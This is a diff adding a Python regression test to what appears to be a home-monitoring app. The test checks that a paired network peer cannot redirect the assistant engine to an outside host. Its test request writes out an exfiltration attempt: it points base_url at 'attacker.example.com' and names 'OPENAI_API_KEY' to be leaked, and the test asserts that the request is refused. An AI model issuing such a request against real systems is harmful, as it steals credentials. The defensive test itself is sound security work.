@@ -803,6 +803,59 @@ def test_ask_route_requires_csrf_header(tmp_path, monkeypatch):
 
 
 # --------------------------------------------------------------------------- #
+# M1 (appsec re-audit, 2026-07, HIGH): the assistant's EGRESS-CONFIG plane (POST
+# /api/assistant/engine) must be loopback-root-only. A paired peer is minted
+# role=central with the FULL central DEFAULT_SCOPES (incl. "admin"), so it
+# legitimately clears this router's router-level central+admin gate -- proving
+# that gate alone was not enough: without the route-level require_root
+# tightening, a malicious/compromised peer could select the "manual" engine,
+# point its base_url at an attacker host, and name a REAL secret env var
+# (key_env_var) for /ask -- still peer-reachable, unchanged -- to resolve and
+# leak, alongside coarse house state.
+# --------------------------------------------------------------------------- #
+def test_multidevice_central_peer_forbidden_from_engine_config_but_ask_unchanged(
+        tmp_path, monkeypatch):
+    monkeypatch.setenv("WAVR_MULTIDEVICE", "1")
+    monkeypatch.setenv("WAVR_DB", str(tmp_path / "md.db"))
+    monkeypatch.setenv("WAVR_HOUSE_MAP", str(tmp_path / "house.json"))
+    monkeypatch.setattr("wavr.app._local_ipv4", lambda: "192.168.1.1")
+    _fake_generate(monkeypatch, ["ANSWER: nobody is home"])
+    astore = AssistantEngineStore(":memory:")
+    cstore = ConnectorStore(":memory:")
+    app = create_app(sources=[], storage=Storage(":memory:"),
+                     assistant_store=astore, connector_store=cstore)
+    central_loopback = TestClient(app)
+    code = central_loopback.post("/api/pair-code", json={"role": "central"},
+                                 headers=CSRF).json()["code"]
+    peer = TestClient(app, client=("192.168.1.50", 12345))
+    token = peer.post("/api/pair",
+                      json={"code": code, "device_name": "peer"}).json()["token"]
+    auth = {"Authorization": f"Bearer {token}"}
+    # Router-level gate alone would have let this through -- the READ still does.
+    assert peer.get("/api/assistant/engines", headers=auth).status_code == 200
+    # The exfil attempt: point "manual" at an attacker host + name a real secret
+    # env var. Must be refused, loopback-root-only.
+    r = peer.post(
+        "/api/assistant/engine",
+        json={"engine_id": "manual", "base_url": "https://attacker.example.com",
+             "model": "x", "key_env_var": "OPENAI_API_KEY"},
+        headers=auth)
+    assert r.status_code == 403
+    assert astore.get_manual_config() is None                       # nothing persisted
+    assert astore.selected("wavr_assistant") == "wavr_assistant"    # selection unchanged
+    # /ask is UNCHANGED (read-shaped, bounded by the engine's own tool scope) --
+    # a central peer may still ask a bounded question against whatever engine IS
+    # configured (still the safe default here, since the write above was refused).
+    r = peer.post("/api/assistant/ask", json={"question": "is anyone home?"}, headers=auth)
+    assert r.status_code == 200
+    # The loopback operator (true root) still can reconfigure the engine.
+    r = central_loopback.post("/api/assistant/engine", json={"engine_id": "local_llm"},
+                              headers=CSRF)
+    assert r.status_code == 200
+    assert astore.selected("wavr_assistant") == "local_llm"
+
+
+# --------------------------------------------------------------------------- #
 # ADVERSARIAL: the thesis this feature exists to prove.
 # --------------------------------------------------------------------------- #
 
